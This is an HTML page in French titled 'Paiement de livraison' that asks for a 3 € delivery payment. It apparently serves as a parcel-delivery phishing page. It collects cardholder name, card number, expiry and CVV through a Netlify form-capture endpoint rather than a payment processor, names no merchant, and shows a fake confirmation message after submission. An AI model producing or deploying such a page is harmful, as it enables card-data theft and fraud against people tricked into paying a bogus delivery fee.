
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Paiement de livraison</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .payment-container {
      background: white;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 360px;
      box-sizing: border-box;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }
    .btn {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .card-icons {
      text-align: center;
      margin-bottom: 10px;
    }
    .card-icons img {
      height: 30px;
      margin: 0 5px;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .half {
      width: 100%;
    }
    .input-icon {
      position: relative;
      width: 100%;
    }
    .input-icon input {
      padding-right: 35px;
    }
    .input-icon img {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      height: 18px;
      opacity: 0.6;
      pointer-events: none;
    }
    #confirmation {
      display: none;
      text-align: center;
      margin-top: 20px;
      color: green;
      font-weight: normal;
    }
  </style>
</head>
<body>

<div class="payment-container">
  <div class="card-icons">
    <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
    <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
    <img src="https://img.icons8.com/color/48/000000/jcb.png" alt="JCB">
  </div>

  <h2>Paiement de livraison</h2>

  <form name="livraison-form" method="POST" data-netlify="true">
    <input type="text" name="nom" placeholder="Nom sur la carte" required>
    <div class="input-icon">
      <input type="text" name="numero" placeholder="N° de carte" required>
      <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="carte">
    </div>
    <div class="row">
      <input type="text" name="expiration" placeholder="MM/AA" required class="half">
      <input type="text" name="cvv" placeholder="CVV" required class="half">
    </div>
    <input type="hidden" name="form-name" value="livraison-form">
    <button class="btn" type="submit">Payer 3 €</button>
  </form>

  <div id="confirmation">
    ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
  </div>
</div>

<script>
  if (window.location.search.includes("success=true")) {
    document.querySelector("form").style.display = "none";
    document.getElementById("confirmation").style.display = "block";
  }
</script>

</body>
</html>
